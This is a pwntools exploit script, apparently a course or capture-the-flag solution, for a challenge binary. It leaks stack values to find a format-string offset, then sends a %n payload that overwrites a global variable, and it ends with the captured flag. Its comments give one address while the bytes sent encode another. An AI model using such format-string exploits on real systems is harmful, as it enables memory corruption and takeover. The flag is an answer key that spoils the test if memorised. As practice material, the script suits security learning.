#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./the_answer_keatane --host remotehost --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './the_answer_keatane')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
host = args.HOST or '192.168.20.1'
port = int(args.PORT or 5280+11)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return start_remote(argv, *a, **kw)
    else:
        return start_local(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled

context.log_level = 'error'
def brute_force(prog_name):
    for i in range(1,50):
        try:
            io = process(prog_name)
            io.sendlineafter(b'name?', b'a' * 8 + f'%{i}$lx'.encode())
            output = io.clean(0.3).decode().strip()
            io.close()
            if '61' * 4 in output:
                print(f'{i=} {output=}')
                return i
        except Exception as e:
            print(e)
            pass

# from lesson I retrieve the function used to show the offset of the buffer
# in this case the buffer is user_input. I obtain 14
#brute_force('./the_answer_keatane')

io = start()
io.recvuntil(b'name?')

# I need to overwrite the badcoffee address (0x004048a8) with 42 as seen on Ghidra
# To do that I need to overwrite the user_input buffer with the format string that tells the program to write 42 into badcoffee address

# So I need to send a line composed by:
# - 42 letter a
# - the offset at which I need to write the badcoffee address with 42, so the position is 14 (user_input position) + ceil(42/8 bytes that is the alignment) = 20
# - the address of badcoffee as argument in which 42 will be written
# also, since it is 64-bit, I need to pay attention to alignment, so the line length is 56%8 == 0
io.sendline(b'a' * 42 + b'%20$n ' + b'\xa8\x47\x40\x00\x00\x00\x00\x00')
io.interactive()

# and then the flag is printed:
# BASC{50_LoNg_&_Thanks_for_4ll_tH3_F1sh___91W9vwMS}

